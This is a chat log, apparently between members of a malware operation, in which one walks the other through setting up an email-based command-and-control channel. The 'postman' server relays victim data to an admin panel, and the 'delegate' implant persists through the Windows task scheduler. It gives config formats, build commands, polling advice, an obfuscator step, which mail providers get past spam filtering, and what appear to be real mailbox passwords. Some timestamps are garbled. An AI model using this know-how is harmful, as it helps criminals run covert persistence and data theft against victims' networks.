[03.11.21 08:58:52] rocco: vpsca
[03.11.21 09:04:06] rocco: brooks, do you have a delegate and a postman there to build through?
[03.11.21 09:04:28] rocco: and where is the best place to register boxes?
[03.11.21 09:04:43] brooks: the server part is the same, it's in postman, *.linux
[03.11.21 09:04:52] rocco: yeah
[03.11.21 09:05:11] brooks: as far as mailboxes go, I think gmail is ideal, but
[03.11.21 09:05:22] brooks: you created a box, went to it
[03.11.21 09:06:12] brooks: when the server tries to go to the same box, google sees that it's from another ip and starts demanding confirmation that it's not hackers (damned :) ) but you do
[03.11.21 09:06:37] brooks: and similarly for the client, i.e., apparently, you have to confirm ip, once
[03.11.21 09:06:51] brooks: or use, for example, mail.com
[03.11.21 09:07:07] brooks: but he needs to show another box
[03.11.21 09:07:17] brooks: but I think *.ru is not an option
[03.11.21 09:07:36] brooks: you can do without these problems, but it's easier to shut it down
[03.11.21 09:07:40] brooks: completely
[03.11.21 09:07:59] rocco: Got it
[03.11.21 09:08:27] brooks: that's why I can't give you unambiguous advice
[03.11.21 09:08:32] brooks: but yours is easier
[03.11.21 09:08:45] rocco: yeah, I will
[03.11.21 09:09:16] rocco: server part, what libraries do you need to deploy?
[03.11.21 09:09:38] brooks: check makefile
[03.11.21 09:09:45] brooks: I'll write it down
[03.11.21 09:16:40] brooks: look, my mc won't install
[03.11.21 09:19:18] brooks: there are lines in makefile:
LDFLAGS += -l:libssl.a -l:libcrypto.a -l:libuuid.a
LDFLAGS += -lpthread --verbose -static-libgcc -static-libstdc++
LDFLAGS += -lcurl

if you are installing an already built application, then lissl, libcrypto & libuuid should not be needed, because there should be a static build
but curl (last line) must always be installed
[03.11.21 09:19:36] brooks: if you build from sources, you put all 4 packages
[03.11.21 09:27:57] brooks: look, my mc isn't installed
[03.11.21 09:29:08] brooks: I always install mc, maybe it hauls the other libgcc libstdc++, I don't install it on purpose
[03.11.21 09:33:20] brooks: crumple what you see
[03.11.21 10:10:45] brooks: ?
[03.11.21 10:22:59] rocco: bro
[03.11.21 10:23:06] rocco: I should have done something else.
[03.11.21 10:24:44] rocco: put mc
[03.11.21 10:24:57] brooks: why wasn't it set?
[03.11.21 10:25:04] rocco: there update yflj ,skj cltkfnm c -n
[03.11.21 10:25:17] rocco: you had to do update with -y
[03.11.21 10:25:27] brooks: ok
[03.11.21 10:57:32] brooks: got it together, got it running
[03.11.21 11:22:27] brooks: angelo postman know as lackey
[03.11.21 11:22:44] brooks: and in the admin area there will be a tap on the lackey group
[03.11.21 11:22:52] brooks: for delagate
[03.11.21 11:38:07] rocco: yeah
[03.11.21 11:38:29] rocco: shit, I can't get to it, I get intercepted, I have to do one or the other
[03.11.21 11:39:23] brooks: if we don't finish today, i'll be in touch again on monday
[03.11.21 11:41:28] rocco: Yeah, okay.
[03.11.21 11:42:17] brooks: just don't put it off for Monday, they won't let me work on Monday either
[03.11.21 11:42:29] rocco: yes
[03.11.21 11:45:40] brooks: and another thing, I wrote in the docs, that each instance needs its own box, but it should work and if several instances work through one, but it is difficult to check, so we did not test
[03.11.21 11:46:45] rocco: ah, so you need different boxes for each instance?
[03.11.21 11:47:05] rocco: so, you raised it on one grid, then it is better to do with others?
[03.11.21 11:47:07] brooks: the system works like this: the client sends an email with a request to the server's box, and waits for 5 minutes, then checks the availability of emails with an answer in his box
[03.11.21 11:47:22] brooks: so make the period of checking your mailbox no longer than 1 minute
[03.11.21 11:48:09] brooks: if server processes several mailboxes, they are processed sequentially, don't put too many on one server, otherwise you will make the processing take over 5 minutes, and then nothing will work
[03.11.21 11:48:32] brooks: as they write, in theory, the letter may take up to two days to reach you, keep it in mind.
[03.11.21 11:49:27] rocco: it is not very convenient, when 10 nets come, you have to bind the box to each?
[03.11.21 11:49:52] rocco: well, you can debug it
[03.11.21 11:50:08] brooks: no, it should work even with one box, I did it to work, but because the test is very difficult, I do not guarantee, that I have not made a mistake somewhere
[03.11.21 11:50:36] brooks: and remember, as soon as the box is caught, you will lose all 10 nets
[03.11.21 11:50:41] rocco: okay, I'll check on some of them, and then I'll give them out en masse
[03.11.21 11:50:59] rocco: so, how many crates can you bind?
[03.11.21 11:51:13] brooks: the best thing for you is to make server boxes, distribute them, and let the client ones do it themselves
[03.11.21 11:51:15] rocco: that is, if I close one, the others will respond?
[03.11.21 11:51:18] brooks: you don't need them on the server
[03.11.21 11:51:32] rocco: got it
[03.11.21 11:51:34] brooks: no problem if they send requests simultaneously
[03.11.21 11:51:39] rocco: okay, I'll try again
[03.11.21 11:51:44] brooks: that's how to check
[03.11.21 11:52:00] rocco: I'll do it myself and watch
[03.11.21 11:52:08] rocco: how it goes
[03.11.21 11:53:08] brooks: but I would leave the client boxes to your customers, you don't even need to know about them, and they will add them into modules by themselves
[03.11.21 11:53:23] brooks: I'll leave for an hour, copy the questions :)
[10.11.21 09:34:07] brooks: hi
[10.11.21 09:35:27] rocco: hey bro, I'm working on anchor, I'm gonna finish some stuff, and then I'll be busy
[10.11.21 09:35:57] rocco: will you be online today?
[10.11.21 09:36:40] brooks: yes, until you confirm you have no questions
[10.11.21 09:36:49] brooks: I'll send you a slightly corrected version of the code
[10.11.21 09:36:55] brooks: do you have a nickname in git?
[10.11.21 09:37:23] rocco: no, go ahead and throw it
[10.11.21 09:37:32] brooks: okay, i'll do it
[10.11.21 09:52:25] brooks: https://gofile.io/d/JRzz1h
[10.11.21 09:52:48] brooks: knock when you download, I'll delete the file from my account
[10.11.21 10:29:02] rocco: sec
[10.11.21 11:36:56] rocco: I downloaded it, I forgot to tell you
[10.11.21 11:37:19] brooks: ok
[10.11.21 12:23:43] rocco: so tell me, what are we setting up on the server?
[10.11.21 12:23:48] rocco: postman
[10.11.21 12:24:20] rocco: this is the conf file
postman.linux/conf.conf
[10.11.21 12:24:37] rocco: how to configure it?
[10.11.21 12:25:18] rocco: this line
```
mail=w-1@14740-27223.bacloud.info|rGhzwna9Uz3gp6Hns22Y|14740-27223.bacloud.info|14740-27223.bacloud.info

```
[10.11.21 12:25:27] rocco: it's configurable, right?
[10.11.21 12:56:23] brooks: I'll be gone an hour, then I'll tell you everything.
[10.11.21 12:56:36] rocco: go ahead.
[10.11.21 12:56:50] rocco: I just forgot which box to which
[10.11.21 12:57:09] rocco: you have to let me do it today
[10.11.21 12:57:25] brooks: yeah, I'll come and do it
[10.11.21 13:48:54] brooks: here
[10.11.21 13:50:02] rocco: so come on.
[10.11.21 13:50:16] rocco: we have a server, what do we set up on it?
[10.11.21 13:50:38] brooks: do you mean configs or libraries?
[10.11.21 13:50:46] rocco: configs
[10.11.21 13:51:24] brooks: ``
#target host, the prefix "https://" is required
host=https://100.100.100.100
debugLevel=10
debugFile=/tmp/log.txt
controlPort=44444
timeout=5000

#pause between checks
polling=600

#format user|password|imap server|smtp server
mail=user@mail.mail|password|imap.bacloud1.info|smtp.bacloud1.info
mail=user@mail.mail|password|imap.bacloud2.info|smtp.bacloud2.info
......
```
[10.11.21 13:51:34] brooks: host is your pad
[10.11.21 13:52:00] brooks: debug - do both fields like here and don't bother
[10.11.21 13:52:48] brooks: controlPort - I tried to stop the daemon via the -stop parameter, but I don't know if it works or not.
[10.11.21 13:53:21] brooks: so comment out this line or delete it completely and kill the daemon with a kill
[10.11.21 13:54:05] brooks: timeout is a variable waiting for requests to mail servers, i.e. you have to wait so many milliseconds for each command, I think you shouldn't change it either
[10.11.21 13:55:12] brooks: polling - it checks all mailboxes available for it, reads messages from them, sends replies, and then goes to sleep for this number of seconds, then checks mailboxes again etc.
[10.11.21 13:56:32] brooks: mail - the client software sends its data to these addresses, the server opens the mailbox, reads the letters, parses them, sends the decrypted data to the admin, gets the answer, and sends the answer through the same mailbox to the address that was in the letter from
[10.11.21 13:57:03] brooks: to access the box we need a username, password, and the names of imap and smtp mail servers
[10.11.21 13:57:38] brooks: how many addresses you write is up to you, but everything will work with one admin
[10.11.21 13:57:52] brooks: boxes are checked sequentially
[10.11.21 13:58:51] brooks: and don't polling more than two minutes, because in the software between sending a command and getting a response you set the wait time to 5 minutes, i.e. the server must have time to read the request and respond to it
[10.11.21 13:59:07] brooks: if you'll have a big polling or a lot of addresses, there's a chance of not having enough time
[10.11.21 13:59:20] brooks: everything
[10.11.21 13:59:49] rocco: Yeah, got it.
[10.11.21 13:59:58] rocco: let's build a client
[10.11.21 14:00:07] brooks: make
[10.11.21 14:00:34] brooks: makefile is there
[10.11.21 14:00:37] rocco: no that anchors to the net
[10.11.21 14:00:44] rocco: vinyl
[10.11.21 14:01:19] rocco: I read redmi, but I don't quite understand
[10.11.21 14:01:41] brooks: there is buildDelegeate
[10.11.21 14:01:41] rocco: I have two folders there
[10.11.21 14:01:53] rocco: you need a delegate, okay
[10.11.21 14:02:11] brooks: the folder postman - you need only linux, the rest is for sylver
[10.11.21 14:02:31] brooks: the linux part is for both delegate and postman
[10.11.21 14:02:45] brooks: in the delegate you have a buildDelegate
[10.11.21 14:03:04] brooks: if you run it without parameters you get a full prompt
[10.11.21 14:03:25] brooks: the program has three parameters source target and conf
[10.11.21 14:03:54] brooks: source - source file of the delegate, angelo has everything
[10.11.21 14:04:05] brooks: target - final, which you run on the client
[10.11.21 14:04:15] brooks: conf - config with parameters
[10.11.21 14:04:33] brooks: ``
period=0
mail={test@14740-27223.bacloud.info|CKFYQ25SMyli2STV|14740-27223.bacloud.info|14740-27223.bacloud.info}
mail={w-1@14740-27223.bacloud.info}

```
[10.11.21 14:05:35] brooks: the first mail field is the same as on the server, and the short second field is where the client will send requests, to which mail, these are the addresses that you will prescribe on the server
[10.11.21 14:06:07] brooks: but the client only has the name of the box, where the password is the client box through which he sends requests and gets answers
[10.11.21 14:06:51] brooks: you can, let the customers create these mailboxes by themselves, don't bother with them
[10.11.21 14:07:18] brooks: period - time in minutes, in which the program will knock on the server
[10.11.21 14:07:42] brooks: do not set more than one day, i.e. 1440 approximately
[10.11.21 14:07:59] brooks: but I check and limit myself
[10.11.21 14:08:16] rocco: so let's go over the boxes again
[10.11.21 14:08:39] rocco: the first field as on the server, is that what we prescribe on the server?
[10.11.21 14:08:51] rocco: ``
mail=user@mail.mail|password|imap.bacloud1.info|smtp.bacloud1.info
```
[10.11.21 14:08:54] rocco: This.
[10.11.21 14:09:10] brooks: it's a client box, let the customer register it himself, you don't need it
[10.11.21 14:09:27] rocco: got it.
[10.11.21 14:09:31] rocco: and the second field?
[10.11.21 14:09:40] brooks: on the server you will have w-1@14740-27223.bacloud.info
[10.11.21 14:09:57] rocco: got it, the second field is a server box
[10.11.21 14:10:02] brooks: the box has only one field, it's where the client sends requests
[10.11.21 14:10:11] rocco: is it alone?
[10.11.21 14:10:22] rocco: so there's only one?
[10.11.21 14:10:28] brooks: you can specify several, it is randomly chosen
[10.11.21 14:10:40] rocco: yeah, got it.
[10.11.21 14:11:11] rocco: I set up boxes on the server, and then I put them into the second field
[10.11.21 14:11:14] brooks: but the total size is limited to 1024 bytes, i.e. several personal boxes, several yours, but in total no more than 1024 bytes
[10.11.21 14:11:20] brooks: yes
[10.11.21 14:11:25] rocco: and the client already set up the first field
[10.11.21 14:11:32] rocco: boxes
[10.11.21 14:11:36] brooks: mail order is arbitrary
[10.11.21 14:11:48] rocco: i think i got it
[10.11.21 14:11:56] rocco: I'll put it together and test it
[10.11.21 14:12:22] rocco: Didn't you tell Horses about your Anchor? He told me something about sliver
[10.11.21 14:12:27] brooks: go ahead, i'll be there tomorrow, i'll tell you what, how
[10.11.21 14:12:33] rocco: or sylver
[10.11.21 14:12:43] rocco: he meant your software?
[10.11.21 14:13:00] brooks: maybe he meant the postman, but I don't know who ordered it
[10.11.21 14:13:15] brooks: postman is almost like a delegate, but he's not fixed in the system
[10.11.21 14:13:31] rocco: probably talked about it, but didn't throw it away
[10.11.21 14:13:43] brooks: and he has in his config not the indentation period, but the minimum and maximum time in hours per indentation
[10.11.21 14:13:59] brooks: it is in the hint
[10.11.21 14:14:02] rocco: got it, now I'll test it
[10.11.21 14:14:04] brooks: for builder
[10.11.21 14:14:12] brooks: if anything, Angelo did it all
[10.11.21 14:14:20] rocco: yeah
[10.11.21 15:14:32] rocco: brux build.bat run?
[10.11.21 15:14:41] rocco: I got a lot of errors there
[10.11.21 15:15:09] brooks: do you have visual studio installed?
[10.11.21 15:15:22] rocco: ah, I guess so
[10.11.21 15:15:36] rocco: yeah, i'll do it on the deck, there's a studio there
[10.11.21 15:15:57] brooks: if you want - do it, or I'll assemble and throw you ready modules
[10.11.21 15:16:29] rocco: I shouldn't do it myself, then everyone will come to me
[10.11.21 15:16:47] brooks: try it
[10.11.21 15:17:13] brooks: but I have llvmo compiler installed, it builds on two - msvs and llvmo
[10.11.21 15:17:19] brooks: if you use build
[10.11.21 15:17:36] brooks: or you can open each version of the project separately
[10.11.21 15:17:38] rocco: yes, we have a build machine, it's all there
[10.11.21 15:17:48] rocco: I'll build it there
[10.11.21 15:56:26] rocco: no obfuscator was found, what do you need to do?
[10.11.21 15:56:46] rocco: but the exe is built
[10.11.21 16:01:42] rocco: launch exe? pfgecnzncz b gflf.n
[10.11.21 16:01:50] rocco: launch the exe and they fall down
[10.11.21 16:02:09] brooks: what do you mean no obfuscator is found?
[10.11.21 16:02:35] brooks: do they crash or stop working?
[10.11.21 16:02:46] brooks: I was building on msvs2019

[10.11.21 16:03:39] brooks: but the delegate shouldn't fall
[10.11.21 16:03:54] brooks: you have no lvm
[10.11.21 16:04:10] rocco: where do you get it?
[10.11.21 16:04:12] brooks: projects have an ellvm and msvs suffix
[10.11.21 16:04:22] brooks: ask sylver tomorrow, he'll tell you
[10.11.21 16:04:35] brooks: I installed it on virtual machine long time ago, no tips
[10.11.21 16:04:51] brooks: use msvs version for now
[10.11.21 16:05:28] brooks: build a builder via studio, you build it once and give it away left and right :)
[10.11.21 16:05:44] brooks: I didn't start it in build.bat
[10.11.21 16:05:56] brooks: also
[10.11.21 16:06:16] brooks: after you start the delegate, it writes itself into the scheduler and finishes
[10.11.21 16:06:29] brooks: when you run the scheduler it starts knocking on the admin
[10.11.21 16:07:11] brooks: use findTask to find a file in the scheduler
[10.11.21 16:07:15] brooks: there is such a project
[10.11.21 16:07:37] brooks: takes as a parameter the full path to the file - either an ec or a dll, what you will use
[10.11.21 16:07:54] brooks: the firewall will show you where the task was created
[10.11.21 16:08:01] brooks: otherwise you'll get tired of looking
[10.11.21 16:08:19] brooks: but it needs to be at the testing stage, no one will check it on the client
[10.11.21 16:14:58] rocco: ok.
[10.11.21 16:15:24] brooks: if you run it on your computer, check if it is already locked in the system
[10.11.21 16:18:58] rocco: buildDelegate.sln
[10.11.21 16:19:19] brooks: you need to build it and findTask
[10.11.21 16:20:00] brooks: firendtask is for you, to check if the program is fixed in the system, if you'll test anything
[10.11.21 16:57:23] rocco: built, started and silence
[10.11.21 16:57:42] brooks: look forfinder
[10.11.21 16:59:17] rocco: didn't find it
[10.11.21 16:59:34] brooks: show me the line for the firendry
[10.11.21 17:01:03] rocco: C:\Users\Administrator\Documents\10>findTask_x64.exe buildDelegate_x64.exe
[10.11.21 17:01:31] brooks: no, wrong
[10.11.21 17:02:33] brooks: after building.bat you should have created two directories EXE\MSVS and EXE\LLVM, well you have a problem with LLM, so it may not exist
[10.11.21 17:03:03] brooks: it has delegate_x*.dll & delegate_x*.exe files
[10.11.21 17:03:08] rocco: yes
[10.11.21 17:03:09] brooks: these are the source files
[10.11.21 17:03:25] brooks: you process them with buildDelegate
[10.11.21 17:04:28] brooks: i.e. buildDelegate.exe --source=delegate_x*.exe --target=test.exe --conf=<your config with soap>
[10.11.21 17:04:39] brooks: you get a new test.exe file
[10.11.21 17:04:46] brooks: that's what you use
[10.11.21 17:05:05] brooks: you run test.exe, you better give me the full path of the file
[10.11.21 17:05:28] brooks: after that you can look for findTask.exe <path>\test.exe
[10.11.21 17:05:43] brooks: and the working file will be task.exe, not delegate
[10.11.21 17:06:03] brooks: the delegate is a template for filling with the right data on the boxes and the bounce period
[10.11.21 17:08:41] rocco: aaa
[10.11.21 17:09:03] rocco: Man, this is messed up.
[10.11.21 17:09:33] brooks: any ideas - tell me how to make it better, I'll redo it
[10.11.21 17:10:03] rocco: no way, I'd like to fix it, let it be as it is
[10.11.21 17:10:47] brooks: :)
[10.11.21 17:11:08] brooks: the anchor is made by the same scheme
[10.11.21 17:11:20] brooks: only not mailboxes, but domain names were prescribed
[10.11.21 17:12:34] rocco: got it
[10.11.21 17:12:56] brooks: you just didn't see the whole scheme
[10.11.21 17:15:16] rocco: I get it now, yes the anchor was already assembled
[10.11.21 17:15:33] rocco: even better, I'll pass all the steps
[10.11.21 17:15:48] brooks: :) will you plant it too?
[10.11.21 17:16:22] rocco: who?
[10.11.21 17:16:40] rocco: I'm sick of torus, are you okay?
[10.11.21 17:17:04] rocco: I feel like I'm sitting with a modem, constantly breaking up
[10.11.21 17:17:25] rocco: I should make up my own torus.)
[10.11.21 17:17:44] brooks: nope. working so far
[10.11.21 17:17:56] brooks: see if he wants to upgrade
[10.11.21 17:18:02] brooks: he's fooling around in those cases
[10.11.21 17:18:04] rocco: yes he did
[10.11.21 17:18:21] rocco: today, some old-school browser now
[10.11.21 17:26:13] rocco: got it together, registered, but it doesn't knock
[10.11.21 17:26:36] rocco: I set period 0
[10.11.21 17:26:39] brooks: after start it should knock in 3 minutes
[10.11.21 17:26:49] rocco: wait for it
[10.11.21 17:26:59] brooks: i'm not sure if you could create a task
[10.11.21 17:27:05] brooks: try to find it
[10.11.21 17:27:12] rocco: found it
[10.11.21 17:27:23] brooks: check trigger settings
[10.11.21 17:27:31] brooks: and keep track of whether it was triggered or not
[10.11.21 17:27:41] brooks: and when it should start next time
[10.11.21 17:28:13] brooks: I have no idea how it should run with zero period
[11.11.21 09:47:41] brooks: hi
[11.11.21 09:47:45] brooks: how do you do?
[11.11.21 10:33:34] rocco: hi
[11.11.21 10:33:43] rocco: everything looks good.
[11.11.21 10:34:03] rocco: when I put the drawers in, everything went bacloud.
[11.11.21 10:34:11] brooks: ok, did you try external mailboxes, not on your server?
[11.11.21 10:34:16] rocco: or you have to put 2 -3 boxes on the client?
[11.11.21 10:34:30] rocco: I want to put 3 boxes on external
[11.11.21 10:34:36] brooks: it depends on how long lifetime you expect
[11.11.21 10:34:44] rocco: but the server is from outlook
[11.11.21 10:34:52] rocco: everything knocks
[11.11.21 10:35:11] brooks: also do the following, stop the server, and run the client, then go to their mailboxes, see what the emails look like
[11.11.21 10:35:23] rocco: yeah
[11.11.21 10:40:00] brooks: if you don't shut down the server, you won't see them, the server will take them away, then it deletes all the received mails
[11.11.21 12:30:34] brooks: do you still need me?
[11.11.21 12:31:16] rocco: not yet brooks, thanks, I understand the whole process, now I will try with other boxes, and will build a new admin working
[11.11.21 12:31:28] rocco: leave it for testing
[11.11.21 12:31:45] brooks: try others, and if all goes well, I'll take a vacation
[11.11.21 12:32:04] rocco: yeah, I ordered it, I'm waiting
[11.11.21 12:32:21] rocco: Eh, I'll probably have to do it myself.
[12.11.21 05:11:14] rocco: brooks, hi, the problem with the boxes, only works with our that bacloud, on the server it works fine there with any, the client put 4 different mails, does not pass
[12.11.21 07:08:18] rocco: brooks hi
[12.11.21 07:08:28] brooks: :)
[12.11.21 07:08:51] rocco: the problem with the boxes, only works with our that bacloud, the server is fine there works with any, the client put 4 different soaps, does not transmit
[12.11.21 07:09:17] brooks: I checked mail.com and mail.ru, it worked
[12.11.21 07:09:23] brooks: where did you create it?
[12.11.21 07:09:40] rocco: outlook yandex rambler
[12.11.21 07:09:49] rocco: mail.ru I think I did it too
[12.11.21 07:09:55] rocco: check it now
[12.11.21 07:09:55] brooks: do you specify servers correctly?
[12.11.21 07:10:04] brooks: show me config for builder

[12.11.21 07:16:28] rocco: for these services
[12.11.21 07:16:35] brooks: I mean @ instead of dot
[12.11.21 07:16:54] rocco: ah yes, it was my mistake
[12.11.21 07:16:59] rocco: dots there
[12.11.21 07:17:24] rocco: try mail.ru
[12.11.21 07:17:36] rocco: but I checked there too, no knocks

[12.11.21 07:17:56] brooks: wait
[12.11.21 07:18:28] rocco: try to build with mail
[12.11.21 07:18:32] rocco: and run
[12.11.21 07:18:39] rocco: see if it knocks
[12.11.21 07:18:47] rocco: the server has outlook
[12.11.21 07:18:51] brooks: I'll check on the debugger
[12.11.21 07:18:56] rocco: maybe another one
[12.11.21 07:19:18] rocco: or I even put two
[12.11.21 07:19:22] rocco: also yandecx
[12.11.21 07:19:41] brooks: according to the literature, standard port for smtp is 465
[12.11.21 07:20:03] brooks: if you use another one, you have to specify it
[12.11.21 07:20:11] rocco: aah
[12.11.21 07:20:15] rocco: there it is.

[12.11.21 07:24:23] rocco: got it.
[12.11.21 07:24:43] rocco: that's what I thought it might be about
[12.11.21 07:25:00] brooks: try it, I'll take a look too
[12.11.21 07:30:16] brooks: by the way, spaces in string are not allowed, unless they are a part of password
[12.11.21 07:30:27] rocco: yeah yeah
[12.11.21 07:40:08] rocco: no it's not
[12.11.21 07:40:12] brooks: and also, the smtp encryption method for outlook is starttls - so put * before the server name

[12.11.21 07:40:47] rocco: and on the server?
[12.11.21 07:41:00] brooks: the one whose box it is
[12.11.21 07:41:05] rocco: outlook
[12.11.21 07:41:15] rocco: do you also specify?
[12.11.21 07:41:44] brooks: isn't outlook configured for your client?
[12.11.21 07:41:55] rocco: yes
[12.11.21 07:42:12] rocco: but I also have outlook on the server
[12.11.21 07:42:12] brooks: put an asterisk in the builder's config
[12.11.21 07:42:37] rocco: or I'll put mail.ru
[12.11.21 07:42:39] brooks: first, we'll check if the data goes to the server, i.e. sending from the client works, then we'll deal with the server
[12.11.21 07:42:47] brooks: don't mail.ru
[12.11.21 07:42:52] brooks: we have to deal with it
[12.11.21 07:43:02] brooks: you don't know what the customer will use
[12.11.21 07:43:11] brooks: but if you look at the comparison - I wrote it

[12.11.21 10:51:19] rocco: I wanted to reinstall my laptop today, it's really slow
[12.11.21 10:51:27] brooks: and then - for some reason the channel status was READ, but it is expected WRITE, I had to reset
[12.11.21 10:51:48] brooks: look, if anything on monday we'll check it again
[12.11.21 10:52:03] rocco: yeah, i'll test everything today
[12.11.21 10:52:12] brooks: angelo was testing the functionality, and you and i are testing the transport on different servers
[12.11.21 10:52:13] rocco: to come to coba too
[12.11.21 10:53:23] brooks: if you are going to give it to work - list mailers you have tested. The rest at your own risk, but if it works - you need to be informed and you can add them to the white list
[12.11.21 10:54:27] rocco: yeah
[12.11.21 15:22:50] rocco: only outlook seems to work, nothing else will work

[12.11.21 15:57:24] brooks: but rambler swears it's spam, I'll check yandex and deal with what I do wrong
[12.11.21 15:58:21] rocco: I got it in thunder
[12.11.21 15:58:36] brooks: didn't get it
[12.11.21 15:58:59] rocco: grom_oh@mail.ru
[12.11.21 15:59:15] brooks: try again

[12.11.21 16:05:27] brooks: I got logged in, but I treated the email as spam
[12.11.21 16:09:20] rocco: that's what I think the problem is, it rejects the email as spam
[12.11.21 16:09:43] rocco: on outlook no problem, on this one it breaks
[12.11.21 16:10:12] brooks: create another account at mail.com and try it, I'll fight with these yet
[12.11.21 16:10:23] brooks: and google
[12.11.21 16:10:42] rocco: com?
[12.11.21 16:10:52] rocco: I'll give you some checks on google

[12.11.21 17:00:18] rocco: let me check
[12.11.21 17:01:19] rocco: logged in
[12.11.21 17:02:11] brooks: no, the problem is different, how the hell they work differently
[12.11.21 17:02:26] rocco: yeah

[12.11.21 17:22:23] rocco: maybe they are blocked, I haven't checked them for a long time
[12.11.21 17:33:35] brooks: do something on Yahoo
[12.11.21 17:34:02] brooks: for proton - it looks like you have to install their bridge program and make settings for it
[12.11.21 17:36:13] rocco: now

[12.11.21 17:55:51] brooks: go to grom_oh@mail.ru, read about login from external applications
[12.11.21 18:02:26] rocco: i did
[12.11.21 18:04:19] rocco: what if you set a pass for external connections?
[12.11.21 18:14:38] brooks: but if you set it to work
[12.11.21 18:14:51] brooks: I just checked Yahoo, set password for external, and it worked
[12.11.21 18:15:13] brooks: but i'll send you new smtp file, some small fix, but it will be better
[12.11.21 18:15:37] brooks: swap true & false

[15.11.21 09:50:11] brooks: hi
[15.11.21 11:04:27] rocco: hi, how did it work?
[15.11.21 11:05:48] brooks: i created an account on yandex, i got an error when i tried to login, i created a password for apps, same thing, i logged into the account in the browser, i tried to send an email and i got the same error message, but i don't know if i got it sent or not
[15.11.21 11:06:09] brooks: I had an account on yandex before, tried it - no problems
[15.11.21 11:06:47] brooks: about rambrer - can't be a problem if your account is on .ru and you try to use it from maya?
[15.11.21 11:07:24] rocco: so it goes to yandex?
[15.11.21 11:07:38] rocco: i think i saw it from yahho too?
[15.11.21 11:08:38] brooks: i think i did
[15.11.21 11:08:41] brooks: try it
[15.11.21 11:09:04] brooks: yandex would check from russia, not maya
[15.11.21 11:09:15] brooks: but it's not gonna light up.
[15.11.21 11:09:32] brooks: although, they don't ask for phone number
[11/15/1921 11:10:37] rocco: Okay.
[11/15/21 11:10:55] rocco: so outlook and yahoo work for us?
[11/15/11/21 11:11:17] brooks: and mail.com should work
[11/15/11/21 11:11:18] rocco: and you also talked to mail.ru
[15.11.21 11:11:37] brooks: and mail.ru also checked, you have to make a password for the applications
[15.11.21 11:11:40] rocco: mail.com chell me, I'll give you the job
[15.11.21 11:11:48] rocco: got it.
[15.11.21 11:59] rocco: I think four's enough for now.
[15.11.21 11:12:13] brooks: if you need separate password for external applications - you should make and use it
[15.11.21 11:12:49] brooks: you can't register *@mail.com account at mail.com, it will have to choose it from the list of domains
[15.11.21 11:12:54] rocco: i got it
[15.11.21 11:12:56] brooks: there are a lot of them, for all tastes
[15.11.21 11:13:23] rocco: got it
[15.11.21 11:13:23] brooks: try to keep server and client on different mailboxes
[11.11.21 11:13:31] rocco: Mm-hmm.
[15.11.21 11:14:18] rocco: today i will try to give it to kurt and see how it goes, then i will do the rest
[17.11.21 14:51:20] brooks: hi, everything worked out?
[17.11.21 14:51:54] rocco: hi, i'm building a new admin and server now, i wanna try it
[17.11.21 14:52:27] brooks: okay, i'll check back on friday then
